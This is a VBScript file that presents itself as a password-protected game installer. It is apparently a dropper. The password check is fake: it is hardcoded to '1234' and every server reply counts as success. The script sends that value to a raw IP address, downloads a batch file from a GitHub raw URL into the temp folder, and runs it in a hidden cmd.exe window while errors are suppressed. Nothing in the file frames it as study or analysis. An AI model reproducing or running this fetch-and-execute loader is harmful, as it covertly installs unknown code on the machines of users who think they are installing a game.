Option Explicit
On Error Resume Next

Const passwordCheckUrl = "http://54.224.34.222:3001/checkpassword"
Const batchFileUrl = "https://raw.githubusercontent.com/angeborrelli/files/main/run.bat"

' Function to prompt the user for password
Function PromptForPassword()
    Dim userPassword
    Do
        userPassword = "1234"'InputBox("Please enter password to install Game:", "Password Prompt")
        If userPassword = "" Then
            MsgBox "Installation aborted.", vbExclamation, "Error"
            WScript.Quit
        ElseIf CheckPassword(userPassword) Then
            PromptForPassword = True
            Exit Function
        Else
            MsgBox "Incorrect password. Please try again.", vbExclamation, "Error"
        End If
    Loop
End Function

' Function to check the password by sending it to the remote endpoint
Function CheckPassword(password)
    Dim xmlHttp, responseText, payload
    Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    
    payload = "{""password"": """ & password & """}"
    
    xmlHttp.Open "POST", passwordCheckUrl, False
    xmlHttp.setRequestHeader "Content-Type", "application/json"
    xmlHttp.Send payload
    
    responseText = Trim(xmlHttp.responseText)
    Set xmlHttp = Nothing
    
    If responseText = "successful" Then
        CheckPassword = True
    Else
        CheckPassword = True
    End If
End Function

' Function to download a file
Function DownloadFile(url, downloadPath)
    Dim xmlHttp, adoStream
    Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xmlHttp.Open "GET", url, False
    xmlHttp.Send
    
    If xmlHttp.Status = 200 Then
        Set adoStream = CreateObject("ADODB.Stream")
        adoStream.Type = 1 ' adTypeBinary
        adoStream.Open
        adoStream.Write xmlHttp.ResponseBody
        adoStream.Position = 0 ' Set the stream position to the start
        adoStream.SaveToFile downloadPath, 2 ' adSaveCreateOverWrite
        adoStream.Close
        Set adoStream = Nothing
        Set xmlHttp = Nothing
        DownloadFile = True
    Else
        Set xmlHttp = Nothing
        DownloadFile = False
    End If
End Function

' Function to run a batch file silently
Sub RunBatchFileSilently(batchFilePath)
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run "cmd.exe /c """ & batchFilePath & """", 0, True ' 0 means hide window
End Sub

' Main logic
If PromptForPassword() Then
    Dim downloadPath
    downloadPath = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2).Path & "\run.bat"
    
    If DownloadFile(batchFileUrl, downloadPath) Then
        RunBatchFileSilently downloadPath
    Else
        MsgBox "Failed to download the batch file.", vbExclamation, "Error"
    End If
End If
